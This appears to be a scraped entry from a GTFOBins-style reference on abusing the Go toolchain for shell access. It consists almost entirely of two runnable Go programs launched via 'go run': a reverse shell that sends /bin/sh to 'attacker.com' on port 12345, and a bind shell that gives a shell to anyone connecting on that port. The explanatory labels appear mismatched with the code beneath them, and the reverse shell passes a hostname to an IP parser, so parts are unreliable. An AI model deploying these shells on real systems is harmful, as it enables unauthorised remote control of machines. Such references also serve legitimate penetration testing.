shell.explanation: This executable can spawn an interactive system shell.

UnprivilegedThis function can be performed by any unprivileged user.SudoThis function is performed by the privileged user if executed viasudobecause the acquired privileges are not dropped.RemarksIf there are environment variables involved, they must be passed viasudo VAR=value ...or exported thensudo -E ....

shell.code:
echo -e 'package main
import (
	"os"
	"net"
	"syscall"
)

func main(){
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	ip := net.ParseIP("attacker.com").To4()
	addr := &syscall.SockaddrInet4{Port: 12345}
	copy(addr.Addr[:], ip)
	syscall.Connect(fd, addr)
	syscall.Dup2(fd, 0)
	syscall.Dup2(fd, 1)
	syscall.Dup2(fd, 2)
	syscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())
}' >/path/to/temp-file.go
go run /path/to/temp-file.go
shell.explanation: This executable can send back a reverse system shell to a listening attacker.

shell.code:
echo -e 'package main
import (
	"os"
	"syscall"
)

func main(){
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	addr := &syscall.SockaddrInet4{Port: 12345}
	copy(addr.Addr[:], []byte{0,0,0,0})
	syscall.Bind(fd, addr)
	syscall.Listen(fd, 1)
	nfd, _, _ := syscall.Accept(fd)
	syscall.Dup2(nfd, 0)
	syscall.Dup2(nfd, 1)
	syscall.Dup2(nfd, 2)
	syscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())
}' >/path/to/temp-file.go
go run /path/to/temp-file.go
